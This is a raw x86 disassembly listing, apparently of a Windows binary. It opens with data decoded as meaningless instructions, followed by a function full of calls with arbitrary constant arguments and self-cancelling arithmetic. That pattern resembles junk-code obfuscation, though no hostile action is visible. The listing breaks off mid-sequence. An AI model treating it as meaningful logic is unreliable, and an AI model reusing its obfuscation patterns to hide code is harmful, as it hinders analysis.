  40553e:	add    al,BYTE PTR [eax+ecx*8+0x30000500]
  405545:	and    al,0x20
  405547:	mov    BYTE PTR [esi],al
  405549:	add    BYTE PTR [eax+eax*1],ah
  40554c:	inc    esp
  40554d:	add    al,BYTE PTR [edx+eax*1]
  405550:	add    BYTE PTR [eax],cl
  405552:	dec    edx
  405553:	enter  0x708,0x31
  405557:	add    BYTE PTR [eax],ah
  405559:	inc    esp
  40555a:	add    al,0x1
  40555c:	inc    eax
  40555d:	rol    DWORD PTR [ecx],0x0
  405560:	and    BYTE PTR [eax-0x5efffff7],al
  405566:	or     BYTE PTR [eax+0x280e8288],0x20
  40556d:	add    BYTE PTR [eax],dl
  40556f:	add    BYTE PTR [ecx+eax*1],ah
  405572:	add    BYTE PTR [ebx+0x2a64130],al
  405578:	ret    0x1050
  40557b:	push   eax
  40557c:	shl    BYTE PTR [eax],0xc7
  40557f:	dec    ebp
  405580:	add    BYTE PTR ds:0x8c024103,al
  405586:	inc    eax
  405587:	add    BYTE PTR [ecx+0x4006000c],ah
  40558d:	mov    ds:0x84d48a10,al
  405592:	adc    BYTE PTR [esp+edx*1+0x5],ch
  405596:	or     eax,0x38000001
  40559b:	add    ah,BYTE PTR [edx]
  40559d:	inc    eax
  40559e:	xor    al,0x0
  4055a0:	push   eax
  4055a1:	add    al,BYTE PTR [eax]
  4055a3:	dec    eax
  4055a4:	add    BYTE PTR [edx],dl
  4055a6:	add    al,0x98
  4055a8:	add    BYTE PTR [eax],dl
  4055aa:	and    BYTE PTR [edx],dl
  4055ac:	pop    edx
  4055ad:	add    BYTE PTR [edx+eax*4+0x3302],al
  4055b4:	add    BYTE PTR [edx+eax*2],dl
  4055b7:	test   ah,ah
  4055b9:	add    DWORD PTR [eax],eax
  4055bb:	add    DWORD PTR [edx+0x8022004],edx
  4055c1:	add    cl,BYTE PTR fs:[ecx]
  4055c4:	or     BYTE PTR [eax],ch
  4055c6:	adc    BYTE PTR [eax+0x1003200],al
  4055cc:	add    al,0x8
  4055ce:	and    BYTE PTR [edx],al
  4055d0:	adc    BYTE PTR [edx-0x3f],al
  4055d3:	and    BYTE PTR [eax],al
  4055d5:	or     BYTE PTR [edx],al
  4055d7:	push   eax
  4055d8:	add    BYTE PTR [eax],cl
  4055da:	add    BYTE PTR [ecx-0x7f],dl
  4055dd:	or     BYTE PTR [ebx+0x20],ah
  4055e0:	add    BYTE PTR [eax],al
  4055e2:	and    BYTE PTR [ecx],0x88
  4055e5:	add    BYTE PTR [eax+0x1],al
  4055e8:	add    BYTE PTR [eax+eax*1],cl
  4055eb:	dec    eax
  4055ec:	dec    ebp
  4055ed:	add    BYTE PTR [eax],ah
  4055ef:	add    BYTE PTR [ecx],0x29
  4055f2:	pop    esp
  4055f3:	loopne 0x405639
  4055f5:	add    al,0x42
  4055f7:	add    BYTE PTR [eax+0x6280403a],al
  4055fd:	add    DWORD PTR [ecx],eax
  4055ff:	xor    eax,0x9b4041d4
  405604:	or     BYTE PTR [edx+eiz*1+0x47],al
  405608:	inc    ebp
  405609:	jo     0x40565b
  40560b:	xor    BYTE PTR [eax+eax*1],0x1
  40560f:	add    BYTE PTR [ecx],dl
  405611:	inc    eax
  405612:	add    BYTE PTR [eax+eax*2],al
  405615:	or     BYTE PTR [eax+0x10],ch
  405618:	or     BYTE PTR [eax+0x10],al
  40561b:	inc    esi
  40561c:	leave  
  40561d:	inc    eax
  40561e:	mov    al,BYTE PTR [eax+0x20]
  405621:	inc    edx
  405622:	dec    ecx
  405623:	mov    al,0xe0
  405625:	sub    BYTE PTR [edx],cl
  405627:	add    BYTE PTR [eax-0x7c],dh
  40562a:	add    BYTE PTR [eax+0x3],al
  40562d:	inc    eax
  40562e:	add    BYTE PTR [eax],0x48
	...
  405675:	add    BYTE PTR [eax],al
  405677:	add    BYTE PTR [ebp-0x75],dl
  40567a:	in     al,dx
  40567b:	sub    esp,0x3c
  40567e:	mov    edx,0x1eb8
  405683:	call   0x407d25
  405688:	push   0x51
  40568a:	call   0x407fe2
  40568f:	add    esp,0x4
  405692:	push   ebx
  405693:	mov    eax,0xde
  405698:	mov    ecx,DWORD PTR ds:0x4373ec
  40569e:	push   0xab2af900
  4056a3:	push   0x77962800
  4056a8:	push   0x77a9fd00
  4056ad:	push   0xffffffef
  4056af:	call   0x407d25
  4056b4:	add    esp,0x10
  4056b7:	push   0xdcc3e00
  4056bc:	push   0xa7489c00
  4056c1:	push   0xf7c27400
  4056c6:	push   0xedbfd300
  4056cb:	push   0xffffff98
  4056cd:	call   0x407edf
  4056d2:	add    esp,0x14
  4056d5:	push   esi
  4056d6:	mov    DWORD PTR [ebp-0x24],eax
  4056d9:	push   edi
  4056da:	mov    edi,DWORD PTR [ebp-0x24]
  4056dd:	mov    eax,DWORD PTR [ebp-0x24]
  4056e0:	sub    DWORD PTR [ebp-0x24],eax
  4056e3:	xor    DWORD PTR [ebp-0x24],edi
  4056e6:	push   0x3b6b6b00
  4056eb:	push   0x2a
  4056ed:	push   0x47
  4056ef:	call   0x407ba2
  4056f4:	add    esp,0xc
  4056f7:	push   0xffffffc9
  4056f9:	push   0x97753e00
  4056fe:	push   0xdf441000
  405703:	push   0xffffffaf
  405705:	call   0x408624
  40570a:	add    esp,0x10
  40570d:	push   0x13447200
  405712:	push   0x1b
  405714:	push   0x5f
  405716:	call   0x407edf
  40571b:	add    esp,0xc
  40571e:	add    DWORD PTR [ebp-0x24],edi
  405721:	push   0xcde13900
  405726:	call   0x407fe2
  40572b:	add    esp,0x4
  40572e:	push   0x8ddd7400
  405733:	call   0x407edf
  405738:	add    esp,0x4
  40573b:	sub    DWORD PTR [ebp-0x24],eax
  40573e:	mov    ecx,DWORD PTR ds:0x4373ec
  405744:	mov    edx,DWORD PTR [ebp-0x24]
  405747:	push   0xffffffa8
  405749:	push   0xffffff8d
  40574b:	call   0x407ba2
  405750:	add    esp,0x8
  405753:	push   0x26
  405755:	push   0x533aee00
  40575a:	push   0xffffff8d
  40575c:	call   0x408515
  405761:	add    esp,0xc
  405764:	push   0xe7131800
  405769:	push   0x674d3f00
  40576e:	call   0x407edf
  405773:	add    esp,0x8
  405776:	push   0xffffffe8
  405778:	push   0xe33d2000
  40577d:	push   0x2e
  40577f:	push   0xf79c7500
  405784:	call   0x407edf
  405789:	add    esp,0x10
  40578c:	add    eax,edi
  40578e:	call   0x408197
  405793:	push   0x9b3aef00
  405798:	push   0x23
  40579a:	push   0xffffffb0
  40579c:	push   0x4dd54100
  4057a1:	call   0x408783
  4057a6:	add    esp,0x10
  4057a9:	call   0x407fe2
  4057ae:	add    eax,eax
  4057b0:	push   0x4d83ce00
  4057b5:	push   0xfb05c400
  4057ba:	push   0xcb53d700
  4057bf:	call   0x407ba2
  4057c4:	add    esp,0xc
  4057c7:	push   0xffffffda
  4057c9:	call   0x407fe2
  4057ce:	add    esp,0x4
  4057d1:	push   0xffffffd2
  4057d3:	push   0xffffffbc
  4057d5:	push   0x778d3200
  4057da:	push   0xffffff8f
  4057dc:	call   0x4082a5
  4057e1:	add    esp,0x10
  4057e4:	xor    esi,esi
  4057e6:	push   0x39
  4057e8:	call   0x408949
  4057ed:	add    esp,0x4
  4057f0:	call   0x407fe2
  4057f5:	and    esi,eax
  4057f7:	sub    esi,eax
  4057f9:	call   0x408949
  4057fe:	push   0xfaa9700
  405803:	push   0xffffffbd
  405805:	push   0x4f
  405807:	push   0xeb5ab600
  40580c:	push   0xc
  40580e:	call   0x408949
  405813:	add    esp,0x14
  405816:	push   0xf7e67f00
  40581b:	push   0xffffffdb
  40581d:	call   0x4082a5
  405822:	add    esp,0x8
  405825:	push   0xffffffea
  405827:	push   0xd9dc800
  40582c:	push   0x33
  40582e:	push   0x48
  405830:	push   0x44
  405832:	call   0x407ba2
  405837:	add    esp,0x14
  40583a:	push   0x7d
  40583c:	push   0xd8ca600
  405841:	push   0xffffffaa
  405843:	push   0xffffff98
  405845:	push   0x870fc800
  40584a:	call   0x407d25
  40584f:	add    esp,0x14
  405852:	push   0x6d928000
  405857:	push   0x42
  405859:	push   0xffffffeb
  40585b:	call   0x407edf
  405860:	add    esp,0xc
  405863:	push   0x21
  405865:	push   0x3f26bf00
  40586a:	call   0x407edf
  40586f:	add    esp,0x8
  405872:	add    esi,esi
  405874:	cmp    esi,0x3
  405877:	je     0x405917
  40587d:	add    DWORD PTR [ebp-0x24],edi
  405880:	push   0xfbee800
  405885:	push   0x7d
  405887:	push   0xffffff81
  405889:	push   0xedc72900
  40588e:	push   0xffffffff
  405890:	call   0x407fe2
  405895:	add    esp,0x14
  405898:	mov    edi,0xd9
  40589d:	cmp    esi,DWORD PTR [ebp-0xc]
  4058a0:	je     0x405917
  4058a2:	push   0x63
  4058a4:	push   0x37219700
  4058a9:	push   0xffffffad
  4058ab:	call   0x407edf
  4058b0:	add    esp,0xc
  4058b3:	add    DWORD PTR [ebp-0x24],eax
  4058b6:	add    DWORD PTR [ebp-0x24],edi
  4058b9:	push   0x0
  4058bb:	push   0x8f963d00
  4058c0:	call   0x408783
  4058c5:	add    esp,0x8
  4058c8:	sub    esi,eax
  4058ca:	mov    edx,0x110d2200
  4058cf:	mov    edi,DWORD PTR [ebp-0x24]
  4058d2:	push   0x4f028f00
  4058d7:	push   0x56
  4058d9:	call   0x407ba2
  4058de:	add    esp,0x8
  4058e1:	push   0x60
  4058e3:	push   0xffffff9b
  4058e5:	push   0x37318e00
  4058ea:	push   0x7df91b00
  4058ef:	call   0x407d25
  4058f4:	add    esp,0x10
  4058f7:	call   0x407ba2
  4058fc:	sub    DWORD PTR [ebp-0x24],esi
  4058ff:	push   0x7f70fe00
  405904:	call   0x408515
  405909:	add    esp,0x4
  40590c:	and    DWORD PTR [ebp-0x24],eax
  40590f:	call   0x407d25
  405914:	add    DWORD PTR [ebp-0x24],edi
  405917:	push   0x8b7ace00
  40591c:	push   0x65
  40591e:	push   0x4d878600
  405923:	call   0x408515
  405928:	add    esp,0xc
  40592b:	mov    edi,0xfc
  405930:	mov    edx,DWORD PTR [ebp-0x24]
  405933:	call   0x407edf
  405938:	push   0xffffffc7
  40593a:	call   0x407fe2
  40593f:	add    esp,0x4
  405942:	sub    edi,eax
  405944:	push   0x4f5c0800
  405949:	push   0x53
  40594b:	call   0x408197
  405950:	add    esp,0x8
  405953:	push   0x9dce9c00
  405958:	push   0x74
  40595a:	call   0x408515
  40595f:	add    esp,0x8
  405962:	call   0x408197
  405967:	add    edi,edi
  405969:	push   0xffffffe6
  40596b:	push   0x37f2ce00
  405970:	push   0xafac1200
  405975:	call   0x408515
  40597a:	add    esp,0xc
  40597d:	push   0x6dfe3900
  405982:	push   0xf78e0100
  405987:	push   0x4e
  405989:	call   0x407edf
  40598e:	add    esp,0xc
  405991:	push   0xffffffb8
  405993:	push   0x4f2ac600
  405998:	push   0x2e
  40599a:	call   0x407edf
  40599f:	add    esp,0xc
  4059a2:	push   0xab741a00
  4059a7:	push   0x9dc67c00
  4059ac:	call   0x407edf
  4059b1:	add    esp,0x8
  4059b4:	sub    DWORD PTR [ebp-0x24],esi
  4059b7:	call   0x407d25
  4059bc:	push   0xeda72d00
  4059c1:	push   0xb7af4f00
  4059c6:	push   0xe7387f00
  4059cb:	push   0xffffff92
  4059cd:	push   0xdf65900
  4059d2:	call   0x408624
  4059d7:	add    esp,0x14
  4059da:	add    DWORD PTR [ebp-0x24],eax
  4059dd:	push   0x8d809100
  4059e2:	call   0x408949
  4059e7:	add    esp,0x4
  4059ea:	push   0x93594900
  4059ef:	push   0x7de24d00
  4059f4:	push   0x61
  4059f6:	call   0x407fe2
  4059fb:	add    esp,0xc
  4059fe:	push   0x574c2800
  405a03:	push   0x25
  405a05:	push   0xb7373800
  405a0a:	call   0x408515
  405a0f:	add    esp,0xc
  405a12:	push   0xff82400
  405a17:	push   0x6e
  405a19:	call   0x408515
  405a1e:	add    esp,0x8
  405a21:	push   0x3b237a00
  405a26:	push   0xffffff9c
  405a28:	push   0xffffff92
  405a2a:	push   0xfffffffd
  405a2c:	push   0x4c
  405a2e:	call   0x4082a5
  405a33:	add    esp,0x14
  405a36:	add    edi,eax
  405a38:	sub    edi,eax
  405a3a:	push   0x9
  405a3c:	push   0xffffff98
  405a3e:	push   0xeda14000
  405a43:	push   0xffffffca
  405a45:	push   0xffffffaa
  405a47:	call   0x408949
  405a4c:	add    esp,0x14
  405a4f:	sub    edi,eax
  405a51:	push   0xcf5b4100
  405a56:	push   0x6f
  405a58:	call   0x407edf
  405a5d:	add    esp,0x8
  405a60:	push   0x1733fa00
  405a65:	push   0x7
  405a67:	call   0x408515
  405a6c:	add    esp,0x8
  405a6f:	sub    DWORD PTR [ebp-0x24],edi
  405a72:	mov    ecx,DWORD PTR ds:0x4373ec
  405a78:	add    DWORD PTR [ebp-0x24],edi
  405a7b:	push   0xffffffcb
  405a7d:	call   0x408783
  405a82:	add    esp,0x4
  405a85:	push   0xb7150e00
  405a8a:	push   0x5b7aea00
  405a8f:	push   0x16
  405a91:	push   0x76
  405a93:	push   0xf3514400
  405a98:	call   0x408783
  405a9d:	add    esp,0x14
  405aa0:	sub    edi,esi
  405aa2:	mov    ebx,DWORD PTR [ebp-0x24]
  405aa5:	cmp    ebx,0xffffff81
  405aa8:	jne    0x405ac0
  405aaa:	sub    edi,ebx
  405aac:	mov    edx,edi
  405aae:	push   0xc356e500
  405ab3:	push   0x77869300
  405ab8:	call   0x408624
  405abd:	add    esp,0x8
  405ac0:	push   0x6f52e500
  405ac5:	call   0x4082a5
  405aca:	add    esp,0x4
  405acd:	cmp    esi,DWORD PTR ds:0x4373ec
  405ad3:	jne    0x405ada
  405ad5:	call   0x407fe2
  405ada:	test   ebx,0xd2
  405ae0:	je     0x405ae9
  405ae2:	cmp    edi,esi
  405ae4:	je     0x405ae9
  405ae6:	or     DWORD PTR [ebp-0x24],eax
  405ae9:	push   0xdd878a00
  405aee:	call   0x408949
  405af3:	add    esp,0x4
  405af6:	xor    eax,eax
  405af8:	call   0x4082a5
  405afd:	push   0xe
  405aff:	push   0x0
  405b01:	call   DWORD PTR ds:0x4370c4
  405b07:	xor    DWORD PTR [ebp-0x24],eax
  405b0a:	test   eax,0xa41b
  405b0f:	jne    0x405c9c
  405b15:	push   0x43
  405b17:	push   0xafe0c500
  405b1c:	call   0x407fe2
  405b21:	add    esp,0x8
  405b24:	xor    edi,edi
  405b26:	call   0x408783
  405b2b:	mov    eax,0xbc
  405b30:	push   0x3a
  405b32:	push   0xfb58700
  405b37:	push   0x6dcf7200
  405b3c:	push   0x6db78c00
  405b41:	push   0x6d854200
  405b46:	call   0x4082a5
  405b4b:	add    esp,0x14
  405b4e:	mov    esi,edi
  405b50:	push   0xbdfd0d00
  405b55:	push   0x6b
  405b57:	push   0x2
  405b59:	push   0x7f26cf00
  405b5e:	push   0xf3698c00
  405b63:	call   0x407edf
  405b68:	add    esp,0x14
  405b6b:	push   0xffffff8f
  405b6d:	call   0x407fe2
  405b72:	add    esp,0x4
  405b75:	sub    ebx,esi
  405b77:	push   0x8307d900
  405b7c:	push   0x0
  405b7e:	push   0xa7089d00
  405b83:	call   0x408624
  405b88:	add    esp,0xc
  405b8b:	push   0x5c
  405b8d:	push   0x9
  405b8f:	push   0x27295000
  405b94:	push   0xf6c1200
  405b99:	call   0x407fe2
  405b9e:	add    esp,0x10
  405ba1:	or     DWORD PTR [ebp-0x24],eax
  405ba4:	mov    edi,DWORD PTR ds:0x4373e0
  405baa:	test   ebx,0x4a
  405bb0:	je     0x405c7e
  405bb6:	cmp    ebx,eax
  405bb8:	jne    0x405c7e
  405bbe:	push   0xb7a66600
  405bc3:	call   0x407fe2
  405bc8:	add    esp,0x4
  405bcb:	xor    ecx,ecx
  405bcd:	push   0x22
  405bcf:	push   0xcf37fb00
  405bd4:	push   0xffffffc2
  405bd6:	push   0xe70cd500
  405bdb:	push   0x5f
  405bdd:	call   0x407edf
  405be2:	add    esp,0x14
  405be5:	push   0x6d
  405be7:	call   0x407edf
  405bec:	add    esp,0x4
  405bef:	test   ebx,0xe7
  405bf5:	je     0x405c7e
  405bfb:	push   0xd9f1800
  405c00:	push   0xffffff88
  405c02:	push   0xffffffdf
  405c04:	push   0x2b
  405c06:	push   0x3
  405c08:	call   0x408949
  405c0d:	add    esp,0x14
  405c10:	mov    edx,DWORD PTR [ebp-0x24]
  405c13:	push   0x4f
  405c15:	push   0x40
  405c17:	push   0xafd69c00
  405c1c:	push   0x97472300
  405c21:	push   0xfffffffc
  405c23:	call   0x407edf
  405c28:	add    esp,0x14
  405c2b:	add    ebx,esi
  405c2d:	and    edi,esi
  405c2f:	and    edi,esi
  405c31:	push   0xffffffa0
  405c33:	push   0x9b57c900
  405c38:	push   0xdb514700
  405c3d:	call   0x407d25
  405c42:	add    esp,0xc
  405c45:	sub    DWORD PTR [ebp-0x24],esi
  405c48:	push   0xcdfeb100
  405c4d:	push   0xffffffb1
  405c4f:	push   0x12
  405c51:	call   0x408515
  405c56:	add    esp,0xc
  405c59:	push   0xffffffdf
  405c5b:	push   0x3dcb9b00
  405c60:	push   0xddf7600
  405c65:	call   0x407edf
  405c6a:	add    esp,0xc
  405c6d:	mov    ecx,DWORD PTR ds:0x4373e0
  405c73:	call   0x408624
  405c78:	sub    DWORD PTR [ebp-0x24],ebx
  405c7b:	mov    DWORD PTR [ebp-0x24],edi
  405c7e:	mov    DWORD PTR [ebp-0x30],esi
  405c81:	push   0xffffffee
  405c83:	call   0x408197
  405c88:	add    esp,0x4
  405c8b:	push   0x176b3000
  405c90:	push   0xffffff85
  405c92:	push   0x62
  405c94:	call   0x408624
  405c99:	add    esp,0xc
  405c9c:	push   0xe3113800
  405ca1:	push   0xffffff97
  405ca3:	push   0xfffffffe
  405ca5:	push   0xffffffc0
  405ca7:	push   0xfa7e000
  405cac:	call   0x407ba2
  405cb1:	add    esp,0x14
  405cb4:	push   0xffffffe8
  405cb6:	push   0xb784c200
  405cbb:	push   0x5d89d600
  405cc0:	push   0xb32d5d00
  405cc5:	push   0xffffffe5
  405cc7:	call   0x408624
  405ccc:	add    esp,0x14
  405ccf:	push   0x634b8100
  405cd4:	push   0xffffff91
  405cd6:	call   0x407d25
  405cdb:	add    esp,0x8
  405cde:	lea    eax,[ebp-0x20]
  405ce1:	push   eax
  405ce2:	call   DWORD PTR ds:0x437158
  405ce8:	add    DWORD PTR [ebp-0x24],eax
  405ceb:	mov    DWORD PTR [ebp-0x28],eax
  405cee:	or     DWORD PTR [ebp-0x24],eax
  405cf1:	call   DWORD PTR ds:0x437108
  405cf7:	mov    esi,DWORD PTR [ebp-0x24]
  405cfa:	sub    esi,edi
  405cfc:	add    esi,eax
  405cfe:	sub    esi,ebx
  405d00:	and    DWORD PTR [ebp-0x24],eax
  405d03:	xor    ebx,ebx
  405d05:	sub    DWORD PTR [ebp-0x24],ebx
  405d08:	cmp    esi,0xffffffd4
  405d0b:	je     0x405d4f
  405d0d:	mov    ecx,DWORD PTR [ebp-0x24]
  405d10:	mov    DWORD PTR [ebp-0x3c],ebx
  405d13:	mov    edx,DWORD PTR ds:0x4373d8
  405d19:	cmp    ecx,0x20
  405d1c:	jne    0x405d4f
  405d1e:	add    DWORD PTR [ebp-0x3c],esi
  405d21:	mov    ebx,DWORD PTR ds:0x4373f0
  405d27:	mov    edi,DWORD PTR [ebp-0x3c]
  405d2a:	add    edi,edx
  405d2c:	add    edi,ebx
  405d2e:	add    ecx,ecx
  405d30:	xor    DWORD PTR [ebp-0x3c],edi
  405d33:	sub    DWORD PTR [ebp-0x3c],ebx
  405d36:	cmp    edi,0xffffffbe
  405d39:	jne    0x405d4f
  405d3b:	mov    esi,DWORD PTR ds:0x4373f0
  405d41:	mov    edx,DWORD PTR ds:0x4373c0
  405d47:	sub    ecx,edx
  405d49:	sub    DWORD PTR [ebp-0x24],esi
  405d4c:	add    DWORD PTR [ebp-0x24],ecx
  405d4f:	mov    DWORD PTR [ebp-0x18],eax
  405d52:	sub    edx,ebx
  405d54:	mov    ecx,DWORD PTR [ebp-0x24]
  405d57:	mov    ebx,DWORD PTR [ebp-0x24]
  405d5a:	and    ebx,eax
  405d5c:	push   0xffffff8d
  405d5e:	push   0x773dd300
  405d63:	push   0xb78adf00
  405d68:	push   0xffffffd7
  405d6a:	push   0x777e2500
  405d6f:	call   0x408624
  405d74:	add    esp,0x14
  405d77:	push   0x571e0e00
  405d7c:	call   0x407ba2
  405d81:	add    esp,0x4
  405d84:	push   0x7dc70200
  405d89:	call   0x408783
  405d8e:	add    esp,0x4
  405d91:	push   0xf7830d00
  405d96:	push   0xffffffda
  405d98:	push   0x7f392100
  405d9d:	push   0xdda3a600
  405da2:	call   0x4082a5
  405da7:	add    esp,0x10
  405daa:	push   0x170ba900
  405daf:	push   0x4757ac00
  405db4:	push   0xb7284900
  405db9:	push   0xfffffffd
  405dbb:	call   0x407edf
  405dc0:	add    esp,0x10
  405dc3:	push   0xffffffb3
  405dc5:	push   0xffffff90
  405dc7:	push   0x3a
  405dc9:	push   0x3547c00
  405dce:	push   0xffffffa6
  405dd0:	call   0x407d25
  405dd5:	add    esp,0x14
  405dd8:	push   0x12
  405dda:	push   0xfffffff5
  405ddc:	push   0xffffff84
  405dde:	call   0x4082a5
  405de3:	add    esp,0xc
  405de6:	call   0x407edf
  405deb:	push   0x6732ed00
  405df0:	push   0xc3027e00
  405df5:	push   0x48
  405df7:	call   0x408197
  405dfc:	add    esp,0xc
  405dff:	add    ebx,eax
  405e01:	call   0x408197
  405e06:	call   0x408949
  405e0b:	add    DWORD PTR [ebp-0x24],eax
  405e0e:	xor    DWORD PTR [ebp-0x24],ebx
  405e11:	call   DWORD PTR ds:0x4370f0
  405e17:	mov    edx,esi
  405e19:	mov    esi,ebx
  405e1b:	sub    DWORD PTR [ebp-0x24],esi
  405e1e:	cmp    eax,ebx
  405e20:	jne    0x405e91
  405e22:	cmp    esi,0xffffffe8
  405e25:	je     0x405e91
  405e27:	cmp    ebx,DWORD PTR ds:0x4373e0
  405e2d:	je     0x405e91
  405e2f:	cmp    edi,DWORD PTR [ebp-0x14]
  405e32:	jne    0x405e91
  405e34:	mov    edx,DWORD PTR [ebp-0x24]
  405e37:	add    edx,edi
  405e39:	cmp    edx,0xf649
  405e3f:	je     0x405e91
  405e41:	add    DWORD PTR [ebp-0x24],ebx
  405e44:	mov    edi,DWORD PTR [ebp-0x24]
  405e47:	add    edx,eax
  405e49:	mov    ebx,DWORD PTR [ebp-0x24]
  405e4c:	cmp    ebx,0x46
  405e4f:	je     0x405e91
  405e51:	xor    esi,esi
  405e53:	cmp    edi,0xa
  405e56:	jne    0x405e91
  405e58:	cmp    ebx,DWORD PTR [ebp-0x28]
  405e5b:	je     0x405e91
  405e5d:	add    DWORD PTR [ebp-0x24],esi
  405e60:	sub    edx,esi
  405e62:	sub    edx,ebx
  405e64:	cmp    edx,0x1a
  405e67:	jne    0x405e91
  405e69:	mov    esi,ebx
  405e6b:	add    DWORD PTR [ebp-0x24],edx
  405e6e:	test   esi,0x1d
  405e74:	jne    0x405e91
  405e76:	and    DWORD PTR [ebp-0x24],edx
  405e79:	mov    ebx,DWORD PTR [ebp-0x24]
  405e7c:	sub    DWORD PTR [ebp-0x24],edx
  405e7f:	add    DWORD PTR [ebp-0x24],edi
  405e82:	mov    edi,DWORD PTR [ebp-0x24]
  405e85:	add    DWORD PTR [ebp-0x24],ebx
  405e88:	or     DWORD PTR [ebp-0x24],ebx
  405e8b:	add    DWORD PTR [ebp-0x24],esi
  405e8e:	add    DWORD PTR [ebp-0x24],edi
  405e91:	cmp    eax,0x74
  405e94:	je     0x405f29
  405e9a:	push   0x93224b00
  405e9f:	call   0x407fe2
  405ea4:	add    esp,0x4
  405ea7:	xor    esi,esi
  405ea9:	push   0xffffff9d
  405eab:	push   0xaf201200
  405eb0:	push   0xa3074f00
  405eb5:	push   0xddafad00
  405eba:	push   0xaf900900
  405ebf:	call   0x407edf
  405ec4:	add    esp,0x14
  405ec7:	call   0x408624
  405ecc:	call   0x408197
  405ed1:	add    esi,esi
  405ed3:	push   0x9709bc00
  405ed8:	push   0xcd879000
  405edd:	push   0x7332e300
  405ee2:	push   0x17
  405ee4:	push   0x7357d500
  405ee9:	call   0x408949
  405eee:	add    esp,0x14
  405ef1:	push   0x7789c800
  405ef6:	push   0x1f37eb00
  405efb:	push   0x97519700
  405f00:	call   0x408515
  405f05:	add    esp,0xc
  405f08:	mov    DWORD PTR [ebp-0x2c],esi
  405f0b:	push   0x6b62c800
  405f10:	push   0xfffffff9
  405f12:	call   0x407edf
  405f17:	add    esp,0x8
  405f1a:	push   0x8dc97700
  405f1f:	push   0x42
  405f21:	call   0x408783
  405f26:	add    esp,0x8
  405f29:	push   0xffffffb6
  405f2b:	push   0x28
  405f2d:	push   0xffffff8b
  405f2f:	push   0xffffffb8
  405f31:	call   0x407edf
  405f36:	add    esp,0x10
  405f39:	push   0xb3cb900
  405f3e:	push   0x870c9a00
  405f43:	call   0x408949
  405f48:	add    esp,0x8
  405f4b:	push   0x3f11d600
  405f50:	push   0xffffffea
  405f52:	push   0x1d
  405f54:	push   0xffffff8c
  405f56:	push   0x18
  405f58:	call   0x408624
  405f5d:	add    esp,0x14
  405f60:	call   0x408197
  405f65:	xor    ecx,ecx
  405f67:	mov    eax,0x8f
  405f6c:	call   0x407ba2
  405f71:	push   0x39
  405f73:	push   0xffffffa9
  405f75:	call   0x407edf
  405f7a:	add    esp,0x8
  405f7d:	and    eax,ebx
  405f7f:	cmp    eax,0x63
  405f82:	je     0x405f93
  405f84:	cmp    eax,DWORD PTR [ebp-0x28]
  405f87:	jne    0x405f93
  405f89:	push   0xfffffff7
  405f8b:	call   0x408783
  405f90:	add    esp,0x4
  405f93:	sub    ebx,edi
  405f95:	cmp    ebx,DWORD PTR ds:0x4373d8
  405f9b:	je     0x405fe1
  405f9d:	call   0x407ba2
  405fa2:	call   0x407edf
  405fa7:	push   0x2d895800
  405fac:	push   0x23787e00
  405fb1:	push   0xffffff9b
  405fb3:	push   0x41
  405fb5:	push   0x43781f00
  405fba:	call   0x408197
  405fbf:	add    esp,0x14
  405fc2:	call   0x408624
  405fc7:	push   0x37b6ed00
  405fcc:	push   0x77fa3a00
  405fd1:	push   0x77d8f700
  405fd6:	call   0x407ba2
  405fdb:	add    esp,0xc
  405fde:	sub    DWORD PTR [ebp-0x24],ebx
  405fe1:	push   0xaff2aa00
  405fe6:	push   0xf36f1e00
  405feb:	push   0xf198500
  405ff0:	push   0xfffffff8
  405ff2:	call   0x408949
  405ff7:	add    esp,0x10
  405ffa:	mov    edx,DWORD PTR [ebp-0x24]
  405ffd:	push   0x3f
  405fff:	call   0x408949
  406004:	add    esp,0x4
  406007:	call   0x408783
  40600c:	push   0xff53d600
  406011:	push   0xaf850300
  406016:	push   0x1dd36600
  40601b:	push   0xf0ee400
  406020:	call   0x408783
  406025:	add    esp,0x10
  406028:	and    edi,eax
  40602a:	mov    eax,0xa1d4
  40602f:	push   0xffffffd5
  406031:	push   0xff4f5b00
  406036:	push   0x5325f600
  40603b:	push   0xffffffcb
  40603d:	push   0x5
  40603f:	call   0x408197
  406044:	add    esp,0x14
  406047:	mov    ecx,DWORD PTR ds:0x4373c0
  40604d:	push   0xb09bd00
  406052:	push   0x2f
  406054:	push   0xffffffc6
  406056:	call   0x407d25
  40605b:	add    esp,0xc
  40605e:	mov    DWORD PTR [ebp-0x24],edi
  406061:	push   0x6
  406063:	push   0xafddcd00
  406068:	push   0xcd82ae00
  40606d:	call   0x408197
  406072:	add    esp,0xc
  406075:	push   0x7e
  406077:	push   0xdd830c00
  40607c:	push   0xb7476500
  406081:	push   0xe33ce100
  406086:	push   0xef3b1a00
  40608b:	call   0x408197
  406090:	add    esp,0x14
  406093:	push   0xb7bc3000
  406098:	push   0xffffffe0
  40609a:	push   0xffffff9a
  40609c:	call   0x408197
  4060a1:	add    esp,0xc
  4060a4:	push   0x5378ea00
  4060a9:	push   0xffffffbe
  4060ab:	push   0xffffffdf
  4060ad:	push   0xffffffe3
  4060af:	call   0x407fe2
  4060b4:	add    esp,0x10
  4060b7:	and    ebx,esi
  4060b9:	push   0xd76e5300
  4060be:	push   0xbb4f9d00
  4060c3:	push   0xffffff90
  4060c5:	push   0xffffffa6
  4060c7:	call   0x408624
  4060cc:	add    esp,0x10
  4060cf:	push   0xffffffc9
  4060d1:	push   0x78
  4060d3:	push   0xffffffe9
  4060d5:	push   0x50
  4060d7:	push   0x2dee3d00
  4060dc:	call   0x4082a5
  4060e1:	add    esp,0x14
  4060e4:	push   0x2b572200
  4060e9:	push   0xdb5a2c00
  4060ee:	push   0xffffffa8
  4060f0:	call   0x407edf
  4060f5:	add    esp,0xc
  4060f8:	xor    DWORD PTR [ebp-0x24],ebx
  4060fb:	call   0x408783
  406100:	call   0x408515
  406105:	call   0x407ba2
  40610a:	mov    esi,0xa3
  40610f:	push   0x5a
  406111:	push   0x53
  406113:	push   0x334b8d00
  406118:	push   0xc3145b00
  40611d:	push   0x42
  40611f:	call   0x4082a5
  406124:	add    esp,0x14
  406127:	mov    eax,DWORD PTR [ebp-0x24]
  40612a:	push   0xafbdfa00
  40612f:	call   0x407fe2
  406134:	add    esp,0x4
  406137:	push   0xc3019c00
  40613c:	push   0xbded2000
  406141:	push   0x41
  406143:	push   0x67078d00
  406148:	call   0x408783
  40614d:	add    esp,0x10
  406150:	push   0x51
  406152:	push   0x58
  406154:	push   0xffffffb6
  406156:	push   0xedeb7100
  40615b:	call   0x407d25
  406160:	add    esp,0x10
  406163:	push   0x3719f200
  406168:	push   0x69
  40616a:	call   0x407d25
  40616f:	add    esp,0x8
  406172:	push   0x42
  406174:	push   0xaf3d8b00
  406179:	push   0xd7007b00
